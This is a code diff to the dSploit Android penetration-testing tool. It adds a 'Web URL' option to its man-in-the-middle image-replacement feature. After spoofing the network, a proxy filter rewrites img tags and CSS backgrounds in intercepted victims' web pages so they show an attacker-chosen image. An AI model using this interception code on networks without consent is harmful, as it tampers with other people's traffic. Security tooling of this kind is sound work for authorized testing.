@@ -45,6 +45,8 @@ import it.evilsocket.dsploit.R;
 import it.evilsocket.dsploit.SettingsActivity;
 import it.evilsocket.dsploit.core.System;
 import it.evilsocket.dsploit.core.Plugin;
+import it.evilsocket.dsploit.gui.dialogs.ChoiceDialog;
+import it.evilsocket.dsploit.gui.dialogs.ChoiceDialog.ChoiceDialogListener;
 import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog.ConfirmDialogListener;
 import it.evilsocket.dsploit.gui.dialogs.RedirectionDialog;
 import it.evilsocket.dsploit.gui.dialogs.RedirectionDialog.RedirectionDialogListener;
@@ -497,15 +499,81 @@ public class MITM extends Plugin
 			@Override
 			public void onClick(View v) {
 								
-				ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
+				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
 
 				if( activity.getVisibility() == View.INVISIBLE )
 				{
 					setStoppedState();
-
-					mCurrentActivity = activity;
-
-					startActivityForResult( mImagePicker, SELECT_PICTURE );  
+										
+					new ChoiceDialog( MITM.this, "Choose a source:", new String[]{ "Local Images", "Web URL" }, new ChoiceDialogListener(){
+						@Override
+						public void onChoice( int choice ) {
+							if( choice == 0 )
+							{
+								mCurrentActivity = activity;										
+								startActivityForResult( mImagePicker, SELECT_PICTURE );  
+							}
+							else
+							{
+								new InputDialog
+								( 
+									"Image", 
+									"Enter the url of the image :", 
+									"", 
+									true,
+									false,
+									MITM.this, 
+									new InputDialogListener(){
+									@Override
+									public void onInputEntered( String input ) 
+									{
+										String image = input.trim();
+										
+										if( image.isEmpty() == false )
+										{
+											image = image.startsWith("http") ? image : "http://" + image;
+																						
+											activity.setVisibility( View.VISIBLE );
+																						
+											final String resource = image;
+											mSpoofSession = new SpoofSession( );
+											mSpoofSession.start( new OnSessionReadyListener() {									
+												@Override
+												public void onSessionReady() {
+													System.getProxy().setFilter( new Proxy.ProxyFilter() {					
+														@Override
+														public String onDataReceived( String headers, String data ) {												
+															// handle img tags
+															data = data.replaceAll
+															( 
+															  "(?i)<img([^/]+)src=['\"][^'\"]+['\"]", 
+															  "<img$1src=\"" + resource + "\"" 
+															);
+																						
+															// handle css background declarations
+															data = data.replaceAll
+															( 
+															  "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*", 
+															  "background: url(" + resource + ")" 
+															);
+															
+															return data;
+														}
+													});								
+												}
+											});		
+											
+											Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+										}
+										else
+											new ErrorDialog( "Error", "Invalid image url.", MITM.this ).show();
+									}} 
+								).show();	
+							}
+						}
+					}).show();
+					
+					
 				}
 				else
 				{			
